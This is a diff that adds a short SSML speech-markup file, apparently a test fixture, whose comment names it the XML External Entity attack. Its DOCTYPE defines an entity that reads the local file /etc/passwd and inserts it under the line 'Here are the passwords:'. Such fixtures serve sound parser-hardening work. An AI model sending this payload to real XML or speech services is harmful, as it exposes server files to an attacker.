@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!-- SSML version of the “XML External Entity” attack
+     https://en.wikipedia.org/wiki/XML_external_entity_attack
+-->
+<!DOCTYPE test [ 
+    <!ENTITY xxeattack SYSTEM "file:///etc/passwd"> 
+]>
+<speak version="1.1" xmlns="http://www.w3.org/2001/10/synthesis"
+       xml:lang="en-US">
+  <p>Here are the passwords:</p>
+  <p>&xxeattack;</p>
+</speak>
